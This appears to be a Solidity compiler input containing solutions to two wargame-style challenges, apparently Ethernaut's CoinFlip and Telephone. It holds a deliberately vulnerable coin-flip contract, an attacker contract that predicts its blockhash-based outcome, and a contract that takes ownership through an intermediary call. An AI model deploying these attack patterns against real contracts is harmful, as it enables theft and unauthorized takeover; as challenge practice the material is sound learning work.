{
  "language": "Solidity",
  "sources": {
    "contracts/CoinFlip.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert(\"Same Block\");\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}"
    },
    "contracts/CoinFlipAttacker.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {CoinFlip} from \"./CoinFlip.sol\";\n\ncontract CoinFlipAttacker {\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    address public targetAddress;\n\n    CoinFlip target;\n\n    constructor() {\n        \n    }\n\n    function setTarget(address _targetaddress) public {\n        targetAddress = _targetaddress;\n        target = CoinFlip(targetAddress);\n        consecutiveWins = 0 ;\n    }\n\n    function flipAttack() public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert(\"Same Block\");\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        bool result = target.flip(side);\n        if (result) {\n            consecutiveWins++;\n        }\n\n        return result;\n    }\n}"
    },
    "contracts/TelephoneAttacker.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface ITelephone {\n    function changeOwner(address _owner) external;\n}\n\ncontract TelephoneAttacker {\n\n    ITelephone public targetaddress;\n    \n    constructor() {\n\n    }\n\n    function setContract(address _contractAddress) public {\n        targetaddress = ITelephone(_contractAddress);\n    }\n\n    function attacker(address _newowner) public {\n        targetaddress.changeOwner(_newowner);\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "evmVersion": "paris",
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}